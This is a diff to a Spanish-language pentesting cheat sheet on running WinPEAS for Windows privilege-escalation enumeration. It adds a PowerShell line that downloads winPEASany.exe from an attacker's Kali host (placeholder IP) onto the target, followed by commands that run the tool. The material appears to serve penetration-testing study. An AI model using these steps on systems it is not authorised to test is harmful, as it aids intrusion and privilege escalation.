@@ -19,6 +19,9 @@ Tags: #WinPEAS #Windows #PrivEsc #Enumeracion #PostExplotacion #Automatizacion
 ## 1. EJECUTAR
 
 ```powershell
+# Cargar en disco 
+❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/winPEASany.exe','winPEASany.exe')"
+
 # Guardar output a archivo → SIEMPRE hacerlo
 ❯ .\winPEAS.exe   
 ❯ .\winPEASany.exe  
